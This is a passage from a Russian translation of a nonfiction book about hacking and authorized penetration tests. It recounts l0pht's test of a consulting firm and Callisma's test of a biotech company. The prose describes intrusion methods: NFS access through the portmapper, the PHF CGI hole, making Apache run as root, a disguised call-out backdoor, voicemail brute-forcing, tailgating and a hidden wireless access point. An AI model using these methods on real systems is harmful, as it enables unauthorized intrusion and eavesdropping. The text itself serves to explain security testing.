сведения об узлах — из исходящих электронных писем, чтобы помешать ее распространению.  Главным оружием Адриана был «подарок» в виде неправильно сконфигурированных прокси-серверов. Использование такого прокси-сервера позволяет пользователю с внутреннего компьютера компании получать доступ к внешним Интернет-ресурсам. Исследователь изнутри делает запрос о конкретной Интернет-странице; запрос идет на прокси-сервер, который переправляет запрос от имени пользователя и присылает ему ответ.  Чтобы помешать хакеру получить информацию тем способом, каким это удалось Адриану, прокси-серверы должны быть сконфигурированы так, чтобы «слушать» только внутренний интерфейс. Его можно сконфигурировать и так, чтобы он «слышал» только разрешенный список внешних IP-адресов. Таким образом, ни один неавторизованный пользователь извне не сможет соединиться с сервером. Общая ошибка в конфигурации прокси-серверов заключается в том, что они «слушают» все интерфейсы сети, включая и внешние интерфейсы, соединенные с Интернетом. Вместо этого прокси-сервер должен быть сконфигурирован так, чтобы позволять доступ только определенному набору IP-адресов, который должен определяться организацией I A N A (Internet Assigned Numbers Authority) для частных сетей. Есть три блока частных IP-адресов:  От 10.0.0.0 до 10.255.255.255  От 172.16.0.0 до 172.31.255.255  От 192.168.0.0 до 192.168. 255.255  Хорошая идея — ограничение по портам, чтобы ограничить набор услуг, которые предоставляет прокси-сервер, например, ограничить исходящие соединения с HTTP (Интернет) или HTTPS (безопасный Интернет-доступ). Для более тщательного контроля некоторые прокси-серверы, использующие SSL, могут быть сконфигурированы так, чтобы проверять входящий трафик, и иметь возможность убедиться, что неавторизованный протокол не проникает через авторизованный порт. Предпринятые шаги помешают атакующему неадекватно использовать прокси-сервер для соединения с неразрешенными ему сервисами.  После установки и конфигурации прокси-сервера его необходимо проверить на наличие лазеек. Никогда нельзя быть уверенным в собственной неуязвимости, пока не будет проведена тщательная проверка. Прокси-серверы могут быть бесплатно перегружены из Интернета.  Еще один момент: поскольку, устанавливая пакет того или иного программного обеспечения, пользователь может в какой-то момент неосознанно установить и ПО для прокси-сервера, компания должна взять себе за правило тщательно проверять все свои компьютеры на неавторизованную установку прокси-серверов, которые могут быть установлены неосознанно. С этой целью вы можете использовать любимое средство Адриана — Proxy Hunter — для проверки собственной сети. Запомните, что неправильно сконфигурированный прокси-сервер может быть лучшим другом хакера.  Подавляющее большинство хакерских атак может быть остановлено при помощи обычных мер безопасности и стандартных проверок. Опасность случайной установки открытого прокси-сервера слишком часто недооценивается и представляет собой главную уязвимость в большинстве организаций.  По-моему, сказано более, чем достаточно, не правда ли?   ПОСЛЕСЛОВИЕ   Люди с оригинальным мышлением, глубокие философы, какой бы деятельностью они ни занимались, видят мир (или, по крайней мере, его часть) более ясно, чем остальные, и они заслуживают поддержки.  С такими, как Адриан Ламо. имеет смысл сотрудничать конструктивно. Он может сделать много хорошего. Я буду следить за его развитием с удовольствием.       Глава 6.    Мудрость   и   глупость проверок   безопасности      Системы безопасности должны побеждать каждый раз, а атакующему достаточно и одной победы.  Дастин Дюкс   Начальник тюрьмы приглашает экспертов для того, чтобы проверить процедуры безопасности в его учреждении, заботясь о наличии любой бреши, которая позволит заключенному ускользнуть. Все компании думают в том же направлении, что и приводит их в фирмы, занимающиеся обеспечением безопасности, с просьбой проверить защищенность их Интернет-сайта и компьютерных сетей от вторжения хакеров, которые будут пытаться найти путь к важной информации, или местам ограниченного доступа, или же брешей в системах безопасности, которые могли бы поставить компанию на грань риска.  Для людей, занимающихся безопасностью, это носит специальное название «тесты проникновения», или, на профессиональном жаргоне «pen tests». Фирмы, занимающиеся безопасностью, которые проводят эти тесты, часто берут к себе на работу (вот уж сюрприз!) бывших хакеров. И основатели этих фирм часто являются людьми с таким хакерским прошлым, что предпочитают держать его в тайне от своих клиентов. В том, что профессионалы в области безопасности приходят из хакерской среды, есть глубокий смысл, поскольку настоящий хакер хорошо знает, как все традиционные, так и нетрадиционные ходы, которые компании непреднамеренно оставляют открытыми в свои внутренние «святая святых». Многие из этих бывших хакеров знают «с младых ногтей», что термин «безопасность» в большинстве случаев употребляется неправильно.  Любую компанию, которая заказывает «pen test» и ожидает результатов, чтобы убедиться в том, что их система нетронута и не имеет брешей, ожидает сильное разочарование. Профессионалы в бизнесе проведения проверок безопасности часто отыскивают одни и те же старые ошибки: компании просто не прилагают достаточно усилий к тому, чтобы достойно защитить свою ценную информацию и компьютерные системы.  Причина, по которой компании и государственные агентства проводят проверку безопасности, заключается в стремлении узнать истинное положение вещей в данный момент времени. Более того, они могут ощутить прогресс после устранения найденных уязвимостей. Тест проникновения в некотором смысле аналогичен электрокардиограмме. На следующий день после проверки хакер может проникнуть в сеть, используя новые обнаруженные им бреши в ПО, хотя проверка безопасности прошла «на ура».  Поэтому проверять безопасность в надежде, что она подтвердит правильность действий компании по защите ценной информации, просто глупо. Результат скорее всего докажет обратное, что и демонстрируют следующие истории — одна о консалтинговой компании, другая — о биотехнической фирме.   ОДНОЙ   ХОЛОДНОЙ   ЗИМОЙ   Не так давно несколько менеджеров и руководителей большой И Т —компании в Новой Англии собрались в своей комнате для переговоров, чтобы пообщаться с двумя консультантами. Могу себе представить, как технологические эксперты компании удивились, увидев рядом с собой за столом консультанта Питера Затко. в недалеком хакерском прошлом хорошо известного под именем Mudge.  В начале девяностых годов Mudge с приятелями собрал единомышленников, чтобы работать вместе в небольшой комнатке на складе в Бостоне; эта группа стала уважаемым игроком на рынке компьютерной безопасности и стала называться l0pht. или, говоря более точно, l0pht Heavy Industries. (Имя пишется с маленьким 1, нулем вместо буквы «о», затем в хакерском стиле «ph» вместо звука «ф» и произносится «лофт»). После того, как операции становились все более успешными, и репутация фирмы укреплялась. Mudge стали приглашать для того, чтобы он мог поделиться своими знаниями. Он читал лекции в таких местах, как школа военной стратегии в Монте-рее на тему «Информационное оружие» — как проникнуть во вражеский компьютер и нарушить его работу, не будучи замеченным, а также о технологиях разрушения информации и т.п.  Одно из самых популярных средств для компьютерных хакеров (а иногда и для сотрудников безопасности) — это пакет программ под названием l0phtCrack. Волшебные свойства этой программы воспринимаются теми, кто ее использует, как должное, но я подозреваю, что многие другие люди ее люто ненавидят. Группа l0pht привлекла внимание СМИ, поскольку именно ее члены написали эту программу, которая быстро взламывает множество закодированных паролей. Mudge был соавтором в создании l0phtCrack и одним из основателей Интернет-сайта, который сделал эту программу доступной для хакеров и любого заинтересованного человека, сначала бесплатно. а потом — за деньги.   ПЕРВАЯ   ВСТРЕЧА   Запрос, который получила компания Lopht от консалтинговой компании (мы будем называть ее «Newton»), возник после того, как компания решила расширить спектр услуг, который она предлагала своим клиентам, добавив в него тесты безопасности. Вместо того, чтобы нанимать новых людей и постепенно строить соответствующий отдел, они решили обратиться к существующим организациям за теми решениями, которые они могли бы купить и использовать в своих целях. В начале встречи один из сотрудников компании изложил эту идею: «Мы хотим купить вас и сделать частью нашей компании». Mudge вспоминает реакцию:  «Наша реакция была типа: „Хорошо, но… вы нас совсем не знаете“. Мыто знали, что они были глубоко заинтересованы в нас благодаря тому шуму, который СМИ подняли по поводу l0pht».  Отчасти, чтобы выиграть время, необходимое для того, чтобы привыкнуть к мысли о продаже компании, отчасти из-за того, что он не хотел форсировать сделку, Mudge решил выбрать тактику выжидания.  «Я сказал: „ В ы просто не знаете, что покупаете. Что вы скажете о пятнадцати тысячах долларов в качестве нашего гонорара, ведь нам придется серьезно поработать с этими тестами“.  В тот момент l0pht даже не занималась подобными исследованиями. Но я сказал им: « В ы не знаете наших способностей, вы исходите просто из нашей известности. З а п л а т и т е нам пятнадцать тысяч долларов. Е с л и вам не понравится то, что вы получите, то вы просто не будете нас покупать и, тем не менее, потраченное время окупится, поскольку вы получите качественные результаты проверки безопасности, а у н а с будет пятнадцать тысяч д о л л а р о в в банке. С другой стороны, е с л и вам в с е понравится, на ч т о мы искренне надеемся, тогда вы нас купите». Они сказали: «Прекрасно, нас это устраивает». А я подумал; «Что за идиоты!»  В понимании Mudge, в «Newton» сидели «идиоты», поскольку допустили команду l0pht к своим файлам и всей корреспонденции и в то же время хотели купить эту компанию. Он был уверен, что сможет «заглянуть им через плечо».  («Подглядывание через плечо» — этот красочный термин конкретно означает тайное подглядывание за тем, как некто набирает на компьютере свой пароль. Специализирующийся именно в этом занятии хакер может по движению пальцев по клавиатуре определить. что печатает человек, не привлекая к себе особого внимания).   ОСНОВНЫЕ   ПРАВИЛА   Консультанты по безопасности, проводящие тесты безопасности, похожи на полицейских, работающих под прикрытием и покупающих наркотики. Если ничего не знающий другой полицейский заметит это безобразие и наведет на них свой пистолет, то они покажут ему свои полицейские значки. Они могут не опасаться тюрьмы. Консультанты по безопасности, которых пригласили для проверки надежности защиты компании, хотят обладать такой же неприкосновенностью. Правда, вместо полицейского значка каждый участник проверки получает письмо, подписанное кем-то из руководства компании, которое гласит: «Этот человек приглашен для выполнения нашего задания, если вы поймаете его за каким-то противозаконным занятием, не беспокойтесь. Не мешайте ему. Позвольте ему делать свое дело и пошлите мне отчет о деталях инцидента».  В сообществе экспертов безопасности такое письмо всем известно под названием «индульгенции». Все участники проверки стремятся сделать несколько копий этого письма и всегда иметь их при себе, когда они занимаются работой в компании клиента, — это нужно, чтобы обезопасить себя от какого-нибудь ретивого стража порядка, который решит продемонстрировать свою власть и показать руководству свою бдительность, или же от аккуратного сотрудника, который заметит что-то подозрительное, и у него хватит ума вступить в конфликт с проверяющим.  Еще одним обязательным шагом перед тем, как проверка начнется. всегда становится определение клиентом основных правил — какая часть бизнеса компании должна быть включена в проверку, а какая — останется за ее пределами. Является ли эта проверка чисто технической атакой, чтобы посмотреть, смогут ли проверяющие получить доступ к важной информации, найдя незащищенные участки системы или пробравшись через межсетевой экран? Или это проверка приложений общедоступного Интернет-сайта, или внутренней компьютерной сети, или всей системы? Должны ли быть включены в проверку атаки социальных инженеров — попытки обмануть сотрудников и получить неавторизованную информацию? А как быть с физическими атаками, в процессе которых проверяющие пытаются проникнуть в здание, обманув охрану или просочившись через вход «только для сотрудников»? А как насчет попыток получить информацию при помощи «рытья в помойках», то есть, просматривая все мусорные корзины в поисках выброшенной ценной информации? Все это должно быть оговорено заранее.  Часто компании заказывают лишь ограниченную проверку. Один из членов группы l0pht, Карлос, считает такую практику нереальной, подчеркивая, что «хакеры так не работают». Он предпочитает более агрессивный подход, как бой «без перчаток», где нет никаких ограничений. Такой тип проверки не только более результативен и ценен для клиентов, но более привлекателен и для самих проверяющих. Как говорит Карлос, «это гораздо приятнее и интереснее». В данном случае его желания были удовлетворены: компания «Newton» согласилась на неограниченную атаку.  Проверка безопасности по сути своей основана на доверии. Компания, которая приглашает людей для проверки, должна полностью доверять им, чтобы согласиться на проведение оценки безопасности. Более того, большинство бизнес-компаний и правительственных агентств требуют заключения соглашения о неразглашении ( N D A — non disclosure agreement), чтобы законным образом защитить всю свою информацию от неавторизованного раскрытия.  Для проверяющих вполне естественно подписывать NDA. поскольку они вполне могут добраться до секретной информации. (Конечно, N D A кажется чрезмерной предосторожностью: если компания без разрешения использует информацию одного клиента, то она, скорее всего, лишится всех остальных. Тем не менее — береженого Бог бережет, как говорится). Кроме того, проверяющих просят подписать еще одну бумагу о том, что они попытаются не нарушать текущего бизнеса компании.  Команда l0pht для проверки компании Newton состояла из семи сотрудников, которым предстояло работать поодиночке или попарно, причем каждый из членов команды отвечал за тот или иной аспект деятельности компании.   АТАКУЕМ  !   Имея на руках «индульгенции», члены команды l0pht могли быть настолько агрессивны, насколько хотели, они могли даже «шуметь» — имеется в виду, производить такие действия, которые могли бы привлекать к ним внимание, чего обычно проверяющие стараются избегать. Тем не менее, они надеялись остаться невидимыми. «Гораздо круче получить всю информацию так, чтобы тебя до конца не смогли обнаружить. Мы всегда стараемся так поступать», — говорит Карлос.  Поставив перед собой задачу реализации технической атаки на сеть, Mudge был удовлетворен тем, что системный администратор «закрыл перед ним ворота», то есть обезопасил компьютерную систему, сделал то, что должно быть сделано, когда сервер соединен с такой открытой сетью, как Интернет. Он искал файлы и директории, надеясь найти такие, куда можно было бы записать что-нибудь. Если бы ему это удалось, он бы смог модифицировать систему или конфигурационный файл — сделать решающий шаг к взлому системы.  На Интернет-сервере компании «Newton» работало популярное серверное ПО под названием Apache. Первой лазейкой, которую обнаружил Mudge, стал межсетевой экран компании Checkpoint, в котором по умолчанию было сконфигурировано правило, которое пропускало пакеты, исходящие из UDP или ТСР-порта 53 и всех портов с номерами выше 1023. Его первой мыслью было попытаться добраться до их системы экспорта файлов при помощи NFS, но он быстро понял, что в межсетевом экране есть правило, блокирующее доступ к району NFS (порт 2049).  Хотя основные системные сервисы были заблокированы, Mudge знал одну неописанную особенность операционной системы Solaris, которая связывает rpcbind (the portmapper) с портами выше 32770. Программа portmapper приписывает динамические номера портов определенным программам. С помощью portmapper он смог отыскать динамический порт, который был предназначен для услуги mount daemon (mountd). В зависимости от формата запроса, говорит Mudge, «mount daemon» находит запрос NFS (Network File System). поскольку он использует тот же код. «Я получил mount daemon из portmapper. а затем обратился к mount daemon с моим „NFS-запро-сом“». Используя программу под названием nfsshell, он смог удаленно з а г р у з и т ь файловую систему. Mudge говорит: « М ы быстро получили список dial-up номеров. После этого перегрузили всю их систему экспорта файлов. Мы получили полный контроль над системой».  Mudge обнаружил также, что на сервере знаменитую «PHF-дырку» (см. Главу 2 «Когда террорист звонит»). Он смог создать текст PHF C G I для выполнения произвольной команды, разместив строку Unicode перед командой запуска. Просматривая систему с помощью PHF, он понял, что процесс сервера Apache выполняется от имени пользователя «никто». Эта ошибка означала, что он мог переписать содержание файла httpd.conf.  Его стратегия заключалась в том, чтобы изменить конфигурационный файл Apache так, чтобы при следующей перезагрузке Apache сервер работал с привилегиями системного администратора (root account). Ему оставалось найти путь для изменения конфигурации таким образом, чтобы он мог изменить привилегии работы сервера с Apache.  Работая вместе с человеком по кличке Hobbit, они нашли такой способ с помощью программы netcat и нескольких программистских штучек, позволяющих установить связи между уровнями в системе программ. Поскольку системный администратор произвольно менял владельцев файлов в директории « c o n f » на «никто», Mudge смог использовать команду « s e d » для редактирования httpd.conf, так что в следующий раз при запуске Apache он бы работал, как корневая директория root, (лазейка была устранена в следующей версии Apache).  Поскольку все его изменения не могли заработать до нового запуска Apache, ему пришлось какое-то время подождать. Как только сервер будет перезагружен, Mudge сможет выполнить определенные команды, имея привилегии системного администратора через все ту же PHF-дырку: раньше эти команды выполнялись от имени пользователя «никто», но теперь Apache имел бы привилегии root. Имея такую высокую привилегию, очень просто получить полный контроль над системой.  Тем временем атаки l0pht велись и на других «фронтах». То, что большинство хакеров и специалистов в области безопасности называют «рытье в помойках», Mudge величает «физическим анализом». «Мы послали ребят заняться физическим анализом. Один из сотрудников (компании клиента), как я понял, недавно был уволен, и вместо того, чтобы уничтожить все свои бумаги, просто выбросил их в помойку. Наши ребята отыскали их среди мусора. Там было множество авиабилетов, руководств и масса других документов для внутреннего пользования».  «Я хотел показать клиенту, что хорошая система безопасности состоит не только из компьютерной безопасности».  «Наша работа была совсем простой, поскольку они не воспользовались измельчителем. Естественно, гораздо проще выбросить все в помойку, чем пропускать через измельчитель. У меня до сих пор где-то хранится этот мусор».  Ребята из «физической» команды занимались и тем, что проходили в помещения компании, используя достаточно простой, а в правильных обстоятельствах практически беспроигрышный метод, известный под названием «хвостиком в ворота». Суть его в том, что вы идете сразу за сотрудником компании, когда он проходит через дверь в охраняемое помещение, это особенно успешно работает в местах, близких к кафетерию или другим местам, где собираются сотрудники компании. Многие сотрудники, особенно находящиеся на невысоких должностях. предпочитают не возражать против того, что прямо вслед за ними кто-то входит в помещение компании через дверь с секретным замком, опасаясь, что этот человек может быть выше их рангом.  Еще одна команда l0pht занималась атаками на телефонную систему компании и систему голосовой почты. Обычно такая работа н а ч и н а е т с я с того, что выясняется производитель и тип системы, которой пользуется компания-клиент, затем компьютеры устанавливаются в режим «грубой силы» — суть его в том, что пробуется одно расширение за другим в поисках сотрудников, которые не меняют своих паролей или же используют легко узнаваемые пароли. После того, как отыщется уязвимый телефон, атакующие получают возможность прослушивать и сохранять голосовые письма. (Хакеры телефонных систем — «фрикеры» — используют тот же метод для того, чтобы делать звонки за счет других компаний).  В режиме «грубой силы» команда l0pht выявила телефоны, на которые отвечали модемы dial-up. Иногда эти соединения оставляют незащищенными, полагаясь на уже известный нам глупый метод «безопасность через неясность», часто они находятся с внутренней стороны межсетевого экрана.   ЗАТЕМНЕНИЕ   Время шло, команда постепенно накапливала все больше и больше полезной информации, но Mudge никак не мог найти хорошую идею, как ему заставить систему Apache перезагрузиться, после чего он смог бы получить контроль над сетью. Затем произошло несчастье, которое оказалось большой удачей для нашей команды. «В выпуске новостей я услышал, что произошла авария, и отключилось электричество как раз в том районе города, где находилась наша компания.  Произошла трагедия: сотрудник электрокомпании погиб при взрыве оборудования на другом конце города, но это привело к отключению электричества во всем городе.  Я подумал, что если восстановление энергосистемы займет достаточно много времени, то питание сервера должно отключиться».  Это означало бы, что отключится и сервер. После того, как восстановится питание в городе, система будет перезагружена.  «Я сидел и постоянно проверял Интернет-сервер и вдруг он отключился. И м н а д о б у д е т его перегрузить. В с е складывалось д л я н а с просто прекрасно. После включения системы сервер будет перезагружен и Apache начнет работать с привилегиями root, как мы и планировали».  В этот момент l0pht получила возможность полностью проникнуть в компьютеры, что стало для проверяющих «отправной точкой полного сканирования и атаки». Следуя терминологии Карлоса, этот день можно назвать «началом работы».  Команда разработала специальную программу, которая делала невозможным их отключение от системы. Корпоративный межсетевой экран не предназначен для того, чтобы блокировать исходящий трафик, и несложная программа Mudge, установленная на одном из серверов «Newton», каждые несколько минут соединялась с компьютером под его контролем. Такое соединение обеспечивало командный интерфейс типа «команда-уровень», аналогичный тому, что используется пользователями Unix, Linux и старых операционных систем DOS. Другими словами, компьютер в компании «Newton» регулярно предоставлял команде Mudge возможность вводить команды в обход корпоративного межсетевого экрана.  Чтобы их не обнаружили, Mudge назвал свой файл именем, замаскированным под типичные названия файлов этой системы. Любой. заметивший этот файл, предположил бы, что он является нормальной программой.  Карлос занимался изучением базы данных в надежде найти данные о сотрудниках, «Если вы сможете продемонстрировать CIO (Chief Information Officer — руководитель ИТ-подразделения компании) не только его зарплату, но и размер премий, то он сразу же напишет вам отзыв, что вы узнали все». Mudge настроил «нюхач» на все электронные письма, входящие и исходящие из компании. Когда сотрудник «Newton» занялся рутинной проверкой межсетевого экрана, l0pht знали об этом. Они были буквально шокированы тем, что для входа в межсетевой экран использовался открытый текст.  За короткое время l0pht проникли во всю сеть и собрали все необходимые доказательства этому. Mudge говорит: «Вы знаете, я думаю, именно поэтому большинство компаний не любит проводить тесты безопасности в своих сетях. Они знают, что все обстоит очень плохо».   РАСКРЫТИЕ   ГОЛОСОВОЙ   ПОЧТЫ   Команда, занимающаяся исследованием телефонных систем. обнаружила, что некоторые представители руководства «Newton», занимающиеся делом покупки l0pht имеют на своих ящиках голосовой почты пароли, установленные там изначально по умолчанию. Mudge со своей командой начал прослушивать их почту — это было забавно.  Одним из условий, которые они выдвигали для покупки l0pht, было создание мобильной тестовой лаборатории — небольшого, но емкого автомобиля, который надо было начинить разнообразным беспроводным оборудованием, чтобы использовать его для тестирования беспроводных сетей. Одному из членов руководства «Newton» идея покупки автомобиля для группы l0pht показалась настолько абсурдной, что он начал называть его смешным именем «Winnebago». Его голосовая почта буквально переполнена переговорами с другими руководителями с упоминанием этого «Winnebago» и команды l0pht, Mudge это и забавляло, и раздражало.   ОКОНЧАТЕЛЬНЫЙ   ДИАГНОЗ   Когда время тестов подошло к концу, Mudge с коллегами написали отчет и готовились представить его на встрече со всеми руководителями компании «Newton». Сотрудники «Newton» не имели ни малейшего представления, чего ожидать, а команда l0pht знала, что это будет зажигательная встреча.  «Итак, мы передали им наш отчет и по сути дела открыли им глаза. Неудивительно, что они были потрясены. Их выдающийся системный администратор, честно говоря, очень симпатичный парень, был выслежен нами при помощи установленного „нюхача“, мы засекли его, когда он пытался войти в маршрутизатор, пробуя один за другим несколько паролей — все неудачно».  Это были специальные пароли администратора для любых внутренних систем, которые проверяющие получили всего за несколько минут. Mudge с удовольствием вспоминает, как элегантно это было сделано.  «Наиболее интересной частью всей их голосовой почты для нас были переговоры о нашей покупке. Они говорили нам: „Да, ребята, мы хотим вас купить“. Но во время переговоров друг с другом они говорили: „Да, мы действительно хотим заполучить Mudge, но нам совершенно не нужны все его коллеги. Как только они будут наши, лишних мы выкинем“.  Во время встречи с руководством «Newton», команда l0pht представила для прослушивания несколько записанных голосовых писем, а руководство сидело и слушало свои же слова. Но самое главное было еще впереди. Mudge запланировал провести окончательный раунд переговоров о покупке во время этой встречи. Он вспоминает эти подробности с особым удовольствием: «Итак, они заявили: „Мы хотим предложить вам определенную сумму, это предел, до которого мы готовы дойти, и мы выполним в с е наши обязательства“. При этом мы точно знали, что из сказанного ими — правда, а что — ложь».  Они начали разговор со своей минимальной суммы, сказав: «Что вы дум а е т е по поводу этого?». Мы ответили так: « В ы знаете, мы не готовы согласиться на сумму меньше, чем . . . » и назвали им сумму, которая, как мы знали, была их максимальной границей».  Они отвечали: «Нам необходимо обсудить ваше предложение, дайте нам несколько минут, не могли бы вы оставить н а с в комнате одних?» Мы не отнеслись к их предложению серьезно. Но они-то действительно надеялись легко заполучить нас».  Во время заключительной встречи между представителями двух компаний, как вспоминает Mudge, « м ы убедили их, что нет такого компьютера в их сети, к которому мы не смогли бы получить полный доступа. Карлос вспоминает, что „при этом лица присутствующих членов руководства „Newton“ стали бордовыми“.  В конце концов, команда l0pht просто ушла. Они получили свой гонорар в 15000 долларов, но решили не продавать свою компанию.   ОПАСНАЯ   ИГРА   Для консультанта по безопасности Дастина Дюкса, хакерство ради выгоды «просто смешно, главное — это адреналин». Поэтому, когда он пришел в комнату для переговоров фармацевтической компании, которую мы будем называть «Biotech», для того, чтобы обсудить с ними проведение тестов безопасности, он был в бодром состоянии духа и готов к грядущим испытаниям.  Как ведущий консультант в департаменте безопасности компании Callisma (теперь подразделение SBC), Дастин заставил своих сотрудников прийти на это собрание в костюмах и галстуках. Он уже начал было скучать, когда появились сотрудники Biotech в джинсах, майках и шортах, что выглядело тем более необычно, что в районе Бостона в тот год была одна из самых холодных зим за все время наблюдения.  Несмотря на то, что Дастин какое-то время занимался сетевым администрированием, он всегда считал себя экспертом в области безопасности, по его словам, ощущение, что он создан для этого, появилось у него во время службы в авиации: «Я культивировал мою скрытую паранойю: такое состояние души, когда вам кажется, что в любой момент на вас могут напасть».  К компьютерам в седьмом классе его приобщила мачеха. Она тогда работала в одной компании системным администратором. Дастин был совершенно очарован иностранным звучанием ее речи. когда она говорила о своей работе по телефону. Однажды, когда ему было тринадцать, «она принесла домой компьютер, который я забрал в свою комнату и запрограммировал его на создание героев игр Dungeos and Dragon и игры в кости».  Роясь в учебниках по языку Basic и схватывая все, чему он мог научиться у друзей, Дастин развивал свои таланты. Он научился использовать модем для соединения с рабочим местом своей мачехи, чтобы играть в приключенческие игры. Вначале ему нужно было лишь все больше и больше компьютерного времени, но по мере того как он взрослел, он осознал, что его свободный дух плохо монтируется с проведением всей жизни перед терминалом. В качестве консультанта по безопасности он мог сочетать свои таланты со своей тягой к авантюре. Это было оптимальное решение.  Его карьера складывается отлично. «Я просто в восторге от своей профессии», — говорит он. «Это как игра в шахматы. На каждый ваш ход есть ответный ход. И каждый ход полностью меняет ситуацию на доске».   ПРАВИЛА   И  Г  Р  Ы   Для каждой компании имеет смысл озаботиться уровнем своей уязвимости — подумать, насколько успешно меры, которые она предпринимает по защите своей интеллектуальной собственности, могут обезопасить компанию от потери конфиденциальности и от проникновения хакеров, а сотрудников — от электронных вторжений, нацеленных на персональную информацию.  У некоторых компаний есть еще более жесткие резоны, например, защита от правительственных детективных агентств, проигрыш которым может означать потерю важного контракта или исследовательского проекта. Любая компания, имеющая контракт с министерством обороны, попадает в эту категорию. Поэтому любая компания, занимающаяся серьезными биотехнологическими исследованиями, должна помнить о том, что департамент администрации по контролю над лекарствами и продуктами буквально заглядывает через ее плечо — именно в этот разряд и попадал новый клиент Callisma. В соседстве с опасными химикатами, в лабораториях, где ученые проводят такие опыты, о которых эксперты по безопасности и слыхом не слыхивали, этот опыт обещал быть очень интересным.  На первой же встрече с представителями Biotech команда Callisma поняла, что от нее требуется проведение всех возможных типов атак, которые только можно себе представить: от простых до сложных технических атак, от применения методов социальной инженерии до физических взломов. Руководители ИТ-подразделения компании, как часто бывает в таких случаях, были уверены, что все попытки взломщиков окончатся их полным поражением. Biotech сразу же установила такое правило: неприемлемы никакие неточности в документальных доказательствах.  Был продуман механизм прекращения работы проверяющих. Иногда это могло быть сделано достаточно просто, например, для остановки атаки, которая могла негативно повлиять на работу компании, любой из сотрудников должен был произнести предварительно согласованное кодовое слово. Компания также разработала четкие правила по обращению с добытой информацией — как ее следует хранить, когда и кому она должна предоставляться.  Поскольку проведение проверок может пересекаться с обычной работой компании, предусмотрено несколько «а что, если…». Кого следует уведомить, если вдруг нарушится предоставление той или иной услуги? В какую часть системы можно проникать и как? И как проверяющие поймут, до какого предела можно проводить атаку, чтобы не нанести непоправимые потери и не повредить бизнесу компании?  Клиенты часто просят ограничить проверки только техническими атаками и упускают из виду другие лазейки, которые могут быть еще более опасны для компании. Дастин Дюкс говорит:  «Независимо от того, что они говорят, я знаю, что поначалу они хотят только выяснить технические слабости их системы, но на самом деле их уязвимость может быть совсем в другом.. Опытный атакующий всегда пойдет по пути наименьшего сопротивления, отыскивая самое ненадежное звено в системе безопасности. Как поток воды, бегущий вниз по склону, атакующий пойдет к успеху самым простым и эффективным путем».  Атаки из области социальной инженерии, по мнению Дастина, всегда должны входить в состав проверок. (Более подробно о социальной инженерии мы поговорим в Главе 10 «Социальные инженеры — как они работают и как их остановить»).  В этот раз он был почти готов отказаться от этих «номеров из своего репертуара». Если атака физического проникновения не получится «в легкую», он не будет и пытаться это делать. Для него это самый нежелательный вариант даже при наличии «индульгенции». «Если что-то плохое должно случится, оно случается тогда, когда я пытаюсь проникнуть в здание так, чтобы меня не заметили охранники или бдительные сотрудники».  Главное, что следовало определить его команде, прежде чем приступать к делу: в чем самое ценное для тестируемой компании, ее «Священный Грааль». В этой игре электронного слежения с высокими ставками очень важно знать это в точности. Как выяснилось, для фармацевтической компании таким «Священным Граалем» являются финансовые отчеты, списки клиентов, поставщиков, процесс производства и научно-исследовательские разработки.   ПЛАНИРОВАНИЕ   План Дастина заключался в том, чтобы начать проверку «по-тихому» — с незначительной активности, постепенно развивая ее до тех пор, пока кто-нибудь ее не заметит и не подаст знак. Такой подход Дастин выработал на основе своей философии, которую он применяет в ходе тестирования, руководя специально сформированной для «мозгового штурма» группой ( red team —  см. прим. ред. к главе 2  ). «Я пытаюсь во время проверок прежде всего проанализировать оборонительную стратегию, которую применяет компания, и затем обратить ее против нее самой. Они думают: „Давайте поставим себя на место атакующих. Что мы можем им противопоставить?“ Это подход легко использовать против них же. Они никогда не поймут, как им действовать или реагировать, пока не поймут, что самое важное для них самих».  Трудно с этим не согласиться. Как пишет китайский философ Сун Тзу: познай своего врага и самого себя  — и ты победишь.  Все серьезные проверки с согласия заказчика используют те же типы атак, что были уже описаны в этой главе.  «В нашей методике мы выделяем четыре основных типа атак. Техническое проникновение в сеть, именно об этом мы в основном говорим. Социальная инженерия (что мы тоже рассматриваем), прослушивание и подглядывание через плечо. Р ы т ь е в помойках. И, наконец, физическое проникновение. В о т эти ч е т ы р е сферы».   АТАКУЕМ  !   В первый день Дастин отправился в приемную компании Biotech. Справа от места, где сидели охранники, была комната отдыха и кафетерий, в который свободно могли проходить посетители. С другой стороны от охранников была расположена комната для переговоров, в которой и встречалась команда Дастина с руководством Biotech. Охранники расположены в центре, естественно, для того, чтобы контролировать все возможности доступа в компанию, но комната для переговоров им совсем не видна. Заходить в нее может кто угодно, и никто ему не скажет ни слова. Именно это и сделал Дастин со своими коллегами. После чего у них было сколько угодно времени для того, чтобы неспешно оглядеться. При этом никто не знал, что они там были.  Они обнаружили там работающий разъем для подключения к сети, вероятно, для удобства сотрудников компании, которые, естественно, хотят иметь доступ к корпоративной сети во время встреч. Подключив к этому разъему свой ноутбук, Дастин быстро нашел то, что ожидал: он получил доступ к сети за пределами корпоративного межсетевого экрана, что было практически открытым приглашением в систему компании.  Почти как в известном кинофильме «Миссия невыполнима» с тревожной музыкой, Дастин прикрепил к стене небольшое устройство для беспроводного доступа и воткнул его в разъем. Это устройство позволяло сотрудникам Дастина проникать в сеть Biotech с компьютеров, расположенных в машине или автобусе, припаркованных неподалеку от здания. Передача сигнала от такого WAP-устройства (Wireless Access Point) может происходить на расстоянии до ста метров. Используя направленную антенну с большим усилением, можно соединиться со спрятанным WAP даже с большего расстояния.  Дастин предпочитал точки беспроводного доступа, работающие на европейских каналах, что давало его команде определенное преимущество. поскольку эти частоты с меньшей вероятностью будут зафиксированы. «Это совсем не выглядело, как точка беспроводного доступа, поэтому не могло вызвать у людей подозрения. Я оставил ее почти на месяц, и никто ее не заметил и не убрал».  После установки таких устройств Дастин прикреплял к ним небольшую. но выглядевшую очень официально карточку с надписью «Собственность служб информационной безопасности. Не убирать» .  Поскольку на улице было необычно холодно, ни Дастин, ни его коллеги, носящие теперь джинсы и майки, чтобы не отличаться от сотрудников Biotech, не хотели мерзнуть, подолгу сидя в машине на парковке. Поэтому они с удовольствием восприняли тот факт, что Biotech предложил им использовать для работы небольшую неохраняемую комнату в соседнем здании. Ничего особенного, но комната была теплой и в пределах достижимости беспроводного устройства. Они всегда были на связи, что было не очень хорошо для Biotech.  Первая же пробная разведка начавшей работать группы выявила сорок компьютеров с Windows, на которых был административный аккаунт либо без пароля, либо с паролем «password». Другими словам и , у н и х не было вообще н и к а к о й безопасности, что, к а к отмечалось в прежних рассказах, к несчастью, является обычным делом для компьютеров, расположенных в пределах охраняемой зоны корпоративной сети. Компании обычно концентрируются на охране периметра, чтобы защититься от «плохих парней», но оставляют компьютеры внутри совершенно уязвимыми. Тот, кто 